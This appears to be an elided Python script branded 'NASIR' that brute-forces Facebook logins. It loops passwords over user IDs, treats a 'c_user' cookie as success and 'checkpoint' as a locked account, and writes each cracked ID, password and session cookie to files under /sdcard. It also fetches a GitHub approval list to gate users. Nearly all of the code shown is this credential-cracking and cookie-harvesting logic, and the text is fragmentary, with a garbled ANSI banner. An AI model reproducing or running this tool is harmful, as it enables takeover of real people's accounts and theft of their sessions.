...
\033[38;5;46m║\033[38;5;46m║𝗣𝗥??𝗚??𝗔𝗠𝗠𝗜𝗡𝗚║ ║  \033[38;5;46m║\033[38;5;46m║𝗔𝗨𝗧𝗛𝗢𝗥║\033[38;5;46m║𝗡𝗔𝗦𝗜𝗥 ║          ║      
\033[38;5;46m║\033[38;5;46m╚═══════════╝ ║  \033[38;5;46m║\033[38;5;46m╚══════╝\033[38;5;46m╚══════╝          ║
\033[38;5;46m║\033[38;5;46m╔══════╗      ║  \033[38;5;46m║\033[38;5;46m╔══════╗\033[38;5;46m╔════════════╗    ║
...
def chk(): 
  ...
  print ("\033[1;92m╰────────────────────────────────────────────╯")
  try: 
    httpCaht = requests.get("https://github.com/MAX-NASIR/MIX-NASIR/blob/main/Aprov.txt").text 
    if id in httpCaht: 
...
def login_lagi334():
	try:
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN BY NASIR...!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def passwrd():
	...
	print('')
	print(f'>> NASIR {h}💥OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'>> NASIR {k}🔥CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    if "t" in Apk:
                        ...
                        print(f'\r %sNASIR OK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}')
                    wrt = '[NASIR-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='NASIR CP'))
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/NASIR/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='NASIR OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]NASIR OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='NASIR CP'))
					open('/sdcard/NASIR/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
